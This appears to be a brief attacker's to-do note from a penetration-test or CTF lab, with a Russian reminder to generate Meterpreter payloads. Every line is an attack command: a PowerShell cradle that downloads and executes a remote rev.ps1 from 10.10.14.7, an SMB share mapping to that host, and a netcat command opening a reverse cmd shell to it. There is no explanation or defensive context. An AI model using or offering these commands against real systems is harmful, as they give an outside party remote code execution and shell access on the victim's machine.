#TODO: 
cmd /c echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7:8000/rev.ps1') | powershell.exe -noprofile -
net use Z: \\10.10.14.7\share /user:u p
Z:\nc64.exe -e cmd 10.10.14.7 123

---
сгенериовать meterpreter x86 & x64 на разных портах и закинуть в Z:
